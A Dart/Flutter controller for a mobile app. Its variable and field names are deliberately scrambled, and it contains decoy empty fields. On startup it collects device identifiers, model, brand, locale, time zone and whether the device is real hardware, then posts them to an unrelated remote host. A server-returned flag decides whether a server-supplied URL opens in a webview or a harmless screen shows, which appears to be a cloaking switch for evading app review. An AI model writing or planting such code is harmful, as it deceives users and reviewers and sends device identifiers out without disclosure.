import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void reloadMine() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/reload");
  }
}

class PageLogic extends GetxController {

  var ylkisz = RxBool(false);
  var rlktvohm = RxBool(true);
  var mwaecsjt = RxString("");
  var gilbert = RxBool(false);
  var johnston = RxBool(true);
  final lmfqaudc = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    reloadMine();
    super.onInit();
    smpblj();
  }


  Future<void> smpblj() async {

    gilbert.value = true;
    johnston.value = true;
    rlktvohm.value = false;

    lmfqaudc.post("https://sea.kepupmn.info/pzqjlsytvu",data: await etdbmk()).then((value) {
      var aqvhm = value.data["aqvhm"] as String;
      var odmjkpva = value.data["odmjkpva"] as bool;
      if (odmjkpva) {
        mwaecsjt.value = aqvhm;
        jonathon();
      } else {
        bailey();
      }
    }).catchError((e) {
      rlktvohm.value = true;
      johnston.value = true;
      gilbert.value = false;
    });
  }

  Future<Map<String, dynamic>> etdbmk() async {
    final DeviceInfoPlugin qrjsvuh = DeviceInfoPlugin();
    PackageInfo itzrc_hkcaotq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var torkeyx = Platform.localeName;
    var qydxco_ltrYFT = currentTimeZone;

    var qydxco_nZiHy = itzrc_hkcaotq.packageName;
    var qydxco_NkIqm = itzrc_hkcaotq.version;
    var qydxco_QynVrOkI = itzrc_hkcaotq.buildNumber;

    var qydxco_pX = itzrc_hkcaotq.appName;
    var qydxco_Nv = "";
    var qydxco_qzX  = "";
    var qydxco_NazZ = "";
    var cadenKertzmann = "";
    var harmonyBailey = "";
    var josianeBechtelar = "";
    var maeKris = "";
    var rosamondHickle = "";


    var qydxco_YsntWpz = "";
    var nickolasRunolfsdottir = "";
    var qydxco_PNk = false;

    if (GetPlatform.isAndroid) {
      qydxco_Nv = "android";
      var wazhgc = await qrjsvuh.androidInfo;

      qydxco_NazZ = wazhgc.brand;

      qydxco_YsntWpz  = wazhgc.model;
      qydxco_qzX = wazhgc.id;

      qydxco_PNk = wazhgc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      qydxco_Nv = "ios";
      var avzorhft = await qrjsvuh.iosInfo;
      qydxco_NazZ = avzorhft.name;
      qydxco_YsntWpz = avzorhft.model;

      qydxco_qzX = avzorhft.identifierForVendor ?? "";
      qydxco_PNk  = avzorhft.isPhysicalDevice;
    }
    var res = {
      "qydxco_QynVrOkI": qydxco_QynVrOkI,
      "qydxco_NazZ": qydxco_NazZ,
      "nickolasRunolfsdottir" : nickolasRunolfsdottir,
      "qydxco_NkIqm": qydxco_NkIqm,
      "qydxco_nZiHy": qydxco_nZiHy,
      "qydxco_YsntWpz": qydxco_YsntWpz,
      "qydxco_ltrYFT": qydxco_ltrYFT,
      "torkeyx": torkeyx,
      "qydxco_Nv": qydxco_Nv,
      "qydxco_PNk": qydxco_PNk,
      "rosamondHickle" : rosamondHickle,
      "cadenKertzmann" : cadenKertzmann,
      "qydxco_pX": qydxco_pX,
      "harmonyBailey" : harmonyBailey,
      "josianeBechtelar" : josianeBechtelar,
      "maeKris" : maeKris,

      "qydxco_qzX": qydxco_qzX,
    };
    return res;
  }

  Future<void> bailey() async {
    Get.offAllNamed("/remindTab");
  }

  Future<void> jonathon() async {
    Get.offAllNamed("/remindDown");
  }

}
